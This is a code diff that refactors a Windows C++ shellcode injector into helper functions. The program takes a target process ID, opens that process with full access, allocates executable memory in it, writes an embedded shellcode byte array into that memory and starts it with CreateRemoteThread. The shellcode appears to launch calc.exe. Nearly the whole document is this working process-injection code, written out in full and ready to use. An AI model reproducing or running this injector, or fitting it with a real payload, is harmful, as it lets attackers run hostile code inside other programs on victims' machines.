@@ -30,49 +30,25 @@ const char my_shell[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x5
                         "\x6c\x63\x2e\x65\x78\x65\x00";
 size_t shell_code_size = sizeof(my_shell);
 
+DWORD getProcessIdFromArgs(int argc, char *argv[]);
+HANDLE getProcessHandle(DWORD processId);
+LPVOID allocateMemoryInTargetProcess(HANDLE hProcess, size_t size);
+bool writeShellCodeToTargetProcess(HANDLE hProcess, LPVOID remoteBuffer, const char *shellcode, size_t size);
+HANDLE createRemoteThreadInTargetProcess(HANDLE hProcess, LPVOID remoteBuffer);
+
 int main(int argc, char *argv[])
 {
-    PVOID rBuffer = nullptr;
-    DWORD Process_id = NULL, Thread_id = NULL;
+    DWORD processId = getProcessIdFromArgs(argc, argv);
+    HANDLE hProcess = getProcessHandle(processId);
+    LPVOID remoteBuffer = allocateMemoryInTargetProcess(hProcess, shell_code_size);
 
-    HANDLE hProcess = nullptr, hThread = nullptr;
-
-    if (argc < 2)
-    {
-        cout << "Please provide a valid process id." << endl
-             << "%s usage: %s <PID>" << n,
-            argv[0];
-
-        return EXIT_FAILURE;
-    }
-    Process_id = atoi(argv[1]);
-    cout << i << "Attempting to get a handle on the process." << Process_id << endl;
-
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, Process_id);
-
-    if (!hProcess)
-    {
-        cout << n << " Was not able to get a handle on the " << Process_id << " process" << endl;
-        cout << i << "This was the following error." << GetLastError();
-    }
-    cout << k << "We got a handle." << hProcess << endl;
-
-    rBuffer = rBuffer = VirtualAllocEx(hProcess, NULL, shell_code_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-
-    if (!rBuffer)
-    {
-        cout << n << "The buffer was not allocated. With the following error." << GetLastError();
-    }
-    cout << k << "The buffer was allocated with the following memory size in bytes: " << shell_code_size;
-
-    bool memory_written = WriteProcessMemory(hProcess, rBuffer, my_shell, shell_code_size, NULL);
-    if (!memory_written)
+    if (!writeShellCodeToTargetProcess(hProcess, remoteBuffer, my_shell, shell_code_size))
     {
         cout << n << "The shell code was not written in the allocated buffer." << endl;
+        return EXIT_FAILURE;
     }
-    cout << "The shell code was written in the allocated buffer.";
 
-    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, &Thread_id);
+    HANDLE hThread = createRemoteThreadInTargetProcess(hProcess, remoteBuffer);
 
     if (hThread == NULL)
     {
@@ -80,16 +56,85 @@ int main(int argc, char *argv[])
         return EXIT_FAILURE;
     }
 
-    cout << k << " got a handle to the newly-created thread (" << Thread_id << ")" << endl
-         << "\\---0x" << hProcess << endl;
-
-    cout << i << " waiting for thread to finish executing" << endl;
     WaitForSingleObject(hThread, INFINITE);
-    cout << k << " thread finished executing, cleaning up" << endl;
-
     CloseHandle(hThread);
     CloseHandle(hProcess);
-    cout << k << " finished, see you next time :>" << endl;
 
     return EXIT_SUCCESS;
+}
+
+DWORD getProcessIdFromArgs(int argc, char *argv[])
+{
+    if (argc < 2)
+    {
+        cout << "Please provide a valid process id." << endl
+             << "%s usage: %s <PID>" << n,
+            argv[0];
+
+        exit(EXIT_FAILURE);
+    }
+    DWORD processId = atoi(argv[1]);
+    cout << i << "Attempting to get a handle on the process." << processId << endl;
+
+    return processId;
+}
+
+HANDLE getProcessHandle(DWORD processId)
+{
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
+
+    if (!hProcess)
+    {
+        cout << n << " Was not able to get a handle on the " << processId << " process" << endl;
+        cout << i << "This was the following error." << GetLastError();
+        exit(EXIT_FAILURE);
+    }
+    cout << k << "We got a handle." << hProcess << endl;
+
+    return hProcess;
+}
+
+LPVOID allocateMemoryInTargetProcess(HANDLE hProcess, size_t size)
+{
+    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+
+    if (!remoteBuffer)
+    {
+        cout << n << "The buffer was not allocated. With the following error." << GetLastError();
+        exit(EXIT_FAILURE);
+    }
+    cout << k << "The buffer was allocated with the following memory size in bytes: " << size;
+
+    return remoteBuffer;
+}
+
+bool writeShellCodeToTargetProcess(HANDLE hProcess, LPVOID remoteBuffer, const char *shellcode, size_t size)
+{
+    SIZE_T bytesWritten;
+    BOOL success = WriteProcessMemory(hProcess, remoteBuffer, shellcode, size, &bytesWritten);
+
+    if (!success || bytesWritten != size)
+    {
+        cout << n << "The shell code was not written in the allocated buffer." << endl;
+        return false;
+    }
+
+    return true;
+}
+
+HANDLE createRemoteThreadInTargetProcess(HANDLE hProcess, LPVOID remoteBuffer)
+{
+    DWORD threadId;
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, &threadId);
+
+    if (hThread == NULL)
+    {
+        cout << n << " failed to get a handle to the new thread, error: " << GetLastError() << endl;
+        return NULL;
+    }
+
+    cout << k << " got a handle to the newly-created thread (" << threadId << ")" << endl
+         << "\\---0x" << hProcess << endl;
+
+    return hThread;
 }
